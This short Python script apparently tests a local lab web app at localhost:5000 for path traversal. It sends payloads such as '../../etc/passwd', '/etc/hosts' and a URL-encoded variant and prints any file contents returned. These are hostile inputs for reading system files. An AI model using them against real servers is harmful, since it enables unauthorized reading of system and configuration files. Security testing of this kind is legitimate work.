import requests

url = "http://localhost:5000/traversal"
payloads = [
    "safe.txt",                   # Base case
    "../app.py",                  # Go up one directory
    "../../etc/passwd",           # Deeper path traversal
    "/etc/hosts",                 # Absolute path
    "%2e%2e/%2e%2e/etc/passwd"    # URL encoded version
]

print("[+] Path Traversal Tester")

# First, create a safe.txt file for the base case
with open("safe.txt", "w") as f:
    f.write("This is a safe file that should be accessible.")

# Test each payload
for payload in payloads:
    print(f"\nTesting: {payload}")
    r = requests.get(f"{url}?file={payload}")
    
    # Extract the content
    import re
    content = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
    if content:
        print("Content retrieved:")
        content_text = content.group(1)
        # Show just the first few lines if it's large
        if len(content_text.split("\n")) > 5:
            print("\n".join(content_text.split("\n")[:5]) + "\n[...truncated...]")
        else:
            print(content_text)
    else:
        print("Failed to extract content from response")
